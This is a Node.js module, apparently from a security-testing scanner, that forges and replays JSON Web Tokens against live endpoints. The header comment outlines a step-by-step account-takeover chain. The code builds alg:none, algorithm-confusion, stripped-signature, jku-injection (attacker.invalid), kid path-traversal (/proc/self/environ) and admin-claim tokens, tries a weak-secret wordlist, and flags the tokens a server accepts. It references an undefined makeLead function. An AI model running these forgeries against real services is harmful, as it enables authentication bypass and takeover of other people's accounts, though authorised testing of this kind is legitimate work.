'use strict';
/**
 * JWT manipulation testing.
 *
 * The reported pattern that produces full account takeover is a *chain*, and
 * each link is cheap:
 *
 *   1. leak the victim's internal ID (a side-bar query returns every member's ID)
 *   2. forge a token with {"alg":"none"} carrying that ID   <- the crypto flaw
 *   3. change the victim's email with a mutation          <- the authz gap
 *   4. request a password reset                             <- normal flow
 *   5. the reset link now goes to the attacker
 *
 * Step 2 alone is usually low severity. The report that walks this exact chain
 * is why it matters: the researcher notes "if you can't change the data, try
 * changing the cryptographic rules."
 *
 * Everything here is local token construction plus one replayed request. No
 * password guessing, no credential stuffing.
 */

const crypto = require('crypto');

/** base64url encode without padding. */
function b64u(input) {
  return Buffer.from(input).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}
function b64uDecode(s) {
  const pad = s.replace(/-/g, '+').replace(/_/g, '/');
  return Buffer.from(pad + '='.repeat((4 - (pad.length % 4)) % 4), 'base64').toString('utf8');
}

function decodeSegment(seg) {
  try { return JSON.parse(b64uDecode(seg)); } catch { return null; }
}

/** Split a token and read its header/payload. Never throws. */
function parse(token) {
  const parts = String(token || '').split('.');
  // A JWS is exactly three dot-separated parts. Accepting 2 or 5 would let
  // arbitrary strings through as "valid" tokens.
  if (parts.length !== 3) return { valid: false, reason: `expected 3 parts, got ${parts.length}` };
  const header = decodeSegment(parts[0]);
  if (!header) return { valid: false, reason: 'header is not base64url JSON' };
  return {
    valid: true,
    header,
    payload: decodeSegment(parts[1]),
    signature: parts[2] || '',
    parts,
  };
}

/** Build an unsigned token with an arbitrary header/payload. */
function forge(header, payload, signature = '') {
  return `${b64u(JSON.stringify(header))}.${b64u(JSON.stringify(payload))}.${signature}`;
}

const HS = (data, secret) => crypto.createHmac('sha256', secret).update(data).digest();

/** Re-sign an existing token with a candidate secret (weak-secret test). */
function sign(token, secret, alg = 'HS256') {
  const p = parse(token);
  if (!p.valid) return null;
  const head = b64u(JSON.stringify({ ...(p.header || {}), alg }));
  const body = b64u(JSON.stringify(p.payload || {}));
  const sig = b64u(HS(`${head}.${body}`, secret));
  return `${head}.${body}.${sig}`;
}

/** Common weak secrets. Only used to test whether verification is real. */
const WEAK_SECRETS = [
  '', 'secret', 'password', '123456', 'changeme', 'jwt_secret', 'jwtsecret',
  'your-256-bit-secret', 'your_256_bit_secret', 'shhhhh', 'test', 'key',
  'supersecret', 'admin', 'qwerty', 'letmein', 'default', 'none', 'null',
];

/** A short, high-signal wordlist for the weak-secret test. */
function shortlist() {
  return WEAK_SECRETS.concat([
    'HS256', 'keyboard cat', 'keyboard_cat', 'shhhhhhared secret',
    'mysecret', 'secretkey', 'secret-key', 'secret_key', 'token',
    'access_token', 'aVerySecretKey', 'jwt', 'JWT', 'jwttoken',
  ]);
}

/**
 * Build every candidate mutation of a token.
 * @returns {Array<{id, label, token, why, severity}>}
 */
function mutations(token) {
  const p = parse(token);
  if (!p.valid) return [];
  const out = [];
  const hdr = p.header || {};
  const pay = p.payload || {};

  // 1. alg: none — the canonical JWT auth bypass.
  for (const v of ['none', 'None', 'NONE', 'nOnE']) {
    out.push({
      id: 'alg-none', label: `alg=${v}`, token: forge({ ...hdr, alg: v }, pay, ''),
      why: 'unsigned token accepted (alg:none)', severity: 'critical',
    });
  }
  // 2. Algorithm confusion: RS256 header, signed with the public key as HMAC.
  if (/RS/i.test(String(hdr.alg || ''))) {
    out.push({
      id: 'alg-confusion', label: 'RS256->HS256', token: forge({ ...hdr, alg: 'HS256' }, pay, ''),
      why: 'algorithm confusion: asymmetric alg replaced with HMAC', severity: 'high',
      needsSecret: true,
    });
  }
  // 3. Empty signature with the original algorithm retained.
  out.push({
    id: 'empty-sig', label: `${hdr.alg || 'alg'} empty signature`, token: forge(hdr, pay, ''),
    why: 'signature stripped while keeping the original algorithm', severity: 'high',
  });
  // 4. `jku`/`x5u` pointing at attacker infrastructure (SSRF/key injection).
  for (const k of ['jku', 'x5u', 'jwk']) {
    if (hdr[k] !== undefined || true) {
      out.push({
        id: `key-inject-${k}`, label: `${k} injection`, token: forge({ ...hdr, [k]: 'https://attacker.invalid/jwks.json' }, pay, p.signature),
        why: `${k} header points at attacker-controlled key material`, severity: 'high',
      });
      break;
    }
  }
  // 5. `kid` path traversal — reads an arbitrary file as the key.
  for (const kid of ['/dev/null', '../../../../../../dev/null', '/proc/self/environ']) {
    out.push({
      id: 'kid-traversal', label: `kid=${kid}`, token: forge({ ...hdr, kid }, pay, b64u('')),
      why: 'kid header used as a filesystem path (arbitrary key read)', severity: 'high',
    });
  }
  // 6. Privilege claim escalation.
  for (const [claim, value] of [['role', 'admin'], ['is_admin', true], ['admin', true], ['scope', 'admin'], ['permissions', ['admin']], ['is_staff', true], ['sub_level', 9]]) {
    out.push({
      id: `claim-${claim}`, label: `${claim}=${JSON.stringify(value)}`, token: forge(hdr, { ...pay, [claim]: value }, p.signature),
      why: `privilege claim ${claim} elevated without a valid signature`, severity: 'high',
    });
  }
  return out;
}

/** Weak-secret candidates for an HS256/HS384/HS512 token. */
function secretCandidates(token) {
  const p = parse(token);
  if (!p.valid || !/^HS/.test(String(p.header && p.header.alg || ''))) return [];
  return shortlist().map((s) => ({ id: 'weak-secret', secret: s, token: sign(token, s, p.header.alg) }));
}

/**
 * Replay each mutation against an authenticated endpoint and detect acceptance.
 * Acceptance is objective: a 2xx where the original token was needed, or a
 * response body containing data the mutation should not have reached.
 */
async function test(ctx, { url, method = 'GET', token, headers = {}, identity, baselineStatus }) {
  const results = [];
  const send = (tok) => ctx.request.fetch(url, {
    method,
    headers: { ...headers, Authorization: `Bearer ${tok}` },
    timeout: 12000, failOnStatusCode: false,
  }).then(async (r) => ({ status: r.status(), body: (await r.text().catch(() => '')).slice(0, 4000) })).catch((e) => ({ status: 0, body: '', error: String(e.message || e) }));

  const orig = await send(token);
  const baseStatus = baselineStatus != null ? baselineStatus : orig.status;

  const cands = [...mutations(token), ...secretCandidates(token).map((c) => ({ ...c, id: 'weak-secret', label: `secret=${c.secret ? `"${String(c.secret).slice(0, 12)}"` : '""'}` }))];
  for (const c of cands) {
    if (!c.token) continue;
    const r = await send(c.token);
    const accepted = r.status >= 200 && r.status < 300;
    const differsFromAuthed = accepted && orig.status >= 400;
    const novelData = accepted && r.body !== orig.body && r.body.length > 0;
    results.push({
      id: c.id, label: c.label, why: c.why, severity: c.severity,
      status: r.status, accepted: accepted || differsFromAuthed,
      originalStatus: orig.status,
      evidence: `original token -> ${orig.status}; mutated (${c.label}) -> ${r.status}${novelData ? `; response differs (${r.body.length} bytes)` : ''}`,
    });
  }
  return { results, original: { status: orig.status, length: orig.body.length }, identity };
}

/** Turn accepted mutations into leads. */
function toLeads(results, meta = {}) {
  const leads = [];
  const accepted = results.filter((r) => r.accepted);
  for (const r of accepted) {
    leads.push(makeLead({
      cls: 'authn',
      title: `JWT accepted after ${r.label}: ${r.why}`,
      url: meta.url || '',
      source: 'jwt',
      severity_hint: r.severity,
      confidence: 'confirmed',
      evidence: r.evidence,
      proof_needed: [
        'confirm the response is reachable only with a valid session otherwise',
        'identify the privilege or identity the mutated claims grant',
        'chain with an IDOR or email-change mutation to demonstrate impact',
      ],
      chain_hints: ['authz', 'business'],
    }));
  }
  return leads;
}

module.exports = { parse, forge, sign, mutations, secretCandidates, shortlist, test, toLeads, b64u, b64uDecode, HS };
